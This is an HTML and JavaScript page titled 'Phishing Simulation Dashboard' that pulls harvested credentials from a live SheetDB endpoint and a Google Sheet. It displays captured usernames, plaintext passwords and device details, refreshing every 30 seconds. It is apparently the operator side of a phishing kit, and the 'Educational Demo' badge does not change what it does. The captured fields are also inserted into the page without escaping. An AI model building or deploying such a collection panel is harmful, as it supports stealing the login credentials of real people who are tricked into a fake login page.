<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Phishing Simulation Dashboard</title>
  <link href="https://fonts.google.com/css2?family=Syne:wght@600;700;800&family=DM+Mono:wght@400;500&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root { --bg: #050508; --card: #0e0e12; --border: #1e1e28; --accent: #6c5ce7; --accent2: #00cec9; --red: #ff3b30; --green: #00b894; --text: #e8e8f0; --muted: #666680; }
    body { background: var(--bg); color: var(--text); font-family: 'DM Sans', sans-serif; min-height: 100vh; padding: 0; }
    .nav { background: var(--card); border-bottom: 1px solid var(--border); padding: 16px 24px; display: flex; align-items: center; justify-content: space-between; }
    .nav-brand { font-family: 'Syne', sans-serif; font-weight: 800; font-size: 18px; display: flex; align-items: center; gap: 10px; }
    .nav-brand .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--red); box-shadow: 0 0 8px var(--red); animation: blink 1.5s ease-in-out infinite; }
    @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
    .nav-badge { font-size: 12px; font-weight: 600; background: rgba(108,92,231,0.2); color: var(--accent); border: 1px solid rgba(108,92,231,0.4); padding: 4px 12px; border-radius: 20px; }
    .container { padding: 24px; max-width: 900px; margin: 0 auto; }
    .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 24px; }
    .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 18px; }
    .stat-label { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; color: var(--muted); margin-bottom: 8px; }
    .stat-value { font-family: 'Syne', sans-serif; font-size: 28px; font-weight: 800; }
    .stat-value.red { color: var(--red); }
    .stat-value.green { color: var(--green); }
    .stat-value.purple { color: var(--accent); }
    .section-title { font-family: 'Syne', sans-serif; font-size: 12px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); margin-bottom: 12px; }
    .table-wrap { background: var(--card); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; margin-bottom: 24px; overflow-x: auto; }
    table { width: 100%; border-collapse: collapse; min-width: 500px; }
    th { background: rgba(108,92,231,0.08); padding: 12px 16px; text-align: left; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; color: var(--muted); border-bottom: 1px solid var(--border); }
    td { padding: 14px 16px; font-size: 13px; border-bottom: 1px solid var(--border); font-family: 'DM Mono', monospace; }
    tr:last-child td { border-bottom: none; }
    tr:hover td { background: rgba(108,92,231,0.04); }
    .td-password { color: var(--red); font-weight: 500; }
    .td-user { color: var(--accent2); }
    .td-time { color: var(--muted); font-size: 11px; }
    .empty-state { text-align: center; padding: 48px 24px; color: var(--muted); }
    .empty-state .icon { font-size: 40px; margin-bottom: 12px; }
    .empty-state p { font-size: 14px; }
    .header-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
    .btn-refresh { padding: 10px 20px; background: rgba(108,92,231,0.1); border: 1px solid rgba(108,92,231,0.3); color: var(--accent); border-radius: 10px; font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit; transition: background 0.2s; }
    .btn-refresh:hover { background: rgba(108,92,231,0.2); }
    .loading { text-align: center; padding: 40px; color: var(--muted); font-size: 14px; }
    .sheets-link { display: inline-flex; align-items: center; gap: 8px; padding: 10px 20px; background: rgba(52,199,89,0.1); border: 1px solid rgba(52,199,89,0.3); color: var(--green); border-radius: 10px; font-size: 13px; font-weight: 600; text-decoration: none; margin-bottom: 24px; }
  </style>
</head>
<body>
<div class="nav">
  <div class="nav-brand"><div class="dot"></div>Phishing Simulation Dashboard</div>
  <span class="nav-badge">Educational Demo</span>
</div>
<div class="container">
  <div class="stats" style="margin-top:24px;">
    <div class="stat-card"><div class="stat-label">Total Attempts</div><div class="stat-value red" id="stat-total">—</div></div>
    <div class="stat-card"><div class="stat-label">Credentials Captured</div><div class="stat-value purple" id="stat-creds">—</div></div>
    <div class="stat-card"><div class="stat-label">Devices Detected</div><div class="stat-value green" id="stat-devices">—</div></div>
  </div>

  <a href="https://docs.google.com/spreadsheets/d/1OmXFSRx-tTCdim9kelewu_opk2KdC4-bAnO5ZMpMViU/edit" target="_blank" class="sheets-link">
    📊 Open in Google Sheets
  </a>

  <div class="header-row">
    <p class="section-title">Captured Credentials</p>
    <button class="btn-refresh" onclick="loadDashboard()">🔄 Refresh</button>
  </div>
  <div class="table-wrap">
    <table>
      <thead><tr><th>#</th><th>Username</th><th>Password</th><th>Device</th><th>Time</th></tr></thead>
      <tbody id="tableBody">
        <tr><td colspan="5"><div class="loading">Loading data...</div></td></tr>
      </tbody>
    </table>
  </div>
</div>
<script>
  const SHEETDB_API = 'https://sheetdb.io/api/v1/n352uhuqg5kol';

  async function loadDashboard() {
    const tbody = document.getElementById('tableBody');
    tbody.innerHTML = '<tr><td colspan="5"><div class="loading">Loading data...</div></td></tr>';

    try {
      const res = await fetch(SHEETDB_API);
      const data = await res.json();

      document.getElementById('stat-total').textContent = data.length;
      document.getElementById('stat-creds').textContent = data.filter(d => d.username).length;
      const devices = new Set(data.map(d => d.platform)).size;
      document.getElementById('stat-devices').textContent = devices;

      if (data.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5"><div class="empty-state"><div class="icon">🎣</div><p>No attempts yet. Send the link and try logging in!</p></div></td></tr>';
        return;
      }

      tbody.innerHTML = [...data].reverse().map((entry, i) => {
        const time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '—';
        return `<tr>
          <td style="color:var(--muted)">${i + 1}</td>
          <td class="td-user">${entry.username || '—'}</td>
          <td class="td-password">${entry.password || '—'}</td>
          <td>${entry.browser || '—'} · ${entry.platform || '—'}</td>
          <td class="td-time">${time}</td>
        </tr>`;
      }).join('');

    } catch(err) {
      tbody.innerHTML = '<tr><td colspan="5"><div class="empty-state"><div class="icon">⚠️</div><p>Error loading data. Check your SheetDB API.</p></div></td></tr>';
    }
  }

  loadDashboard();
  // Auto refresh every 30 seconds
  setInterval(loadDashboard, 30000);
</script>
</body>
</html>
